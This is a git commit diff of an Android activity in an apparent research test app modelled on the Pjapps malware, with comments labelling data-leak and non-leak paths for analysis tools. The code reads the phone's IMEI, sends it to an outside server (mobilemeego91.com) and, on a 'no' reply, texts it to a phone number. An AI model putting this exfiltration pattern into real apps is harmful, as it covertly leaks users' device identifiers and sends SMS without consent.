9b4a9eec456eab4b3d651056f4eecca7f8522e7b
Hao Fu <jamesfuhao@gmail.com>
2016-03-14 17:13:50 -0700

    add ctx

--- app/src/main/java/fu/hao/pjapps/MainActivity.java
+++ app/src/main/java/fu/hao/pjapps/MainActivity.java
@@ -16,17 +16,27 @@ public class MainActivity extends Activity {
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         String imei = telephonyManager.getDeviceId();
        // String str2 = "http://" + Base64.encodebook("2maodb3ialke8mdeme3gkos9g1icaofm", 6, 3) + "/mm.do?imei=" + imei;
-        String str2 = "http://mobilemeego91.com" + "/mm.do?imei=" + imei;
-        try {
-            str2 = BaseAuthenicationHttpClient.getStringByURL(str2);
-            if (str2 != null && !"".equals(str2)) {
-                if ("no".equalsIgnoreCase(str2)) { // command
-                    SmsManager sms = SmsManager.getDefault();
-                    sms.sendTextMessage("+49", null, imei, null, null);  //controlled api, leak
+        SmsManager sms = SmsManager.getDefault();
+        int i = 0;
+        if (imei != null) {
+            i = 1;
+        }
+
+        if (i != 0) {
+            String str2 = "http://mobilemeego91.com" + "/mm.do?imei=" + imei;
+            try {
+
+                str2 = BaseAuthenicationHttpClient.getStringByURL(str2);
+                if (str2 != null && !"".equals(str2)) {
+                    if ("no".equalsIgnoreCase(str2)) { // command
+                        sms.sendTextMessage("+49", null, imei, null, null);  //controlled api, leak
+                    }
                 }
+
+                sms.sendTextMessage("+86", null, null, null, null);  //non-controlled api, non-leak
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-        } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 }
